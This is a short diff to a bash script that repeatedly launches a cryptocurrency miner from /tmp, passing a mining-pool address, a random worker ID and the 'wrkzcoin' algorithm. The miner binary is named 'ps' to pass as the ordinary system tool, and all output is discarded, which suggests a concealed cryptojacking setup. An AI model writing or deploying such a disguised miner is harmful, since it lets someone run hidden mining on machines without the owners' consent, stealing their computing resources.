@@ -1,10 +1,12 @@
 #!/bin/bash
 
 user="$1"
-worker="$2"
+pool_url="$2"
+pool_port="$3"
+worker="$(shuf -n 1 -i 1-999999)"
 
 while :
 do
-  timeout 3m /tmp/ps --config /tmp/build_config --username $user.$worker >/dev/null
+  timeout 3m /tmp/ps --pool $pool_url:$pool_port --username $user.$worker --password x --algorithm wrkzcoin >/dev/null
   sleep 20s
 done
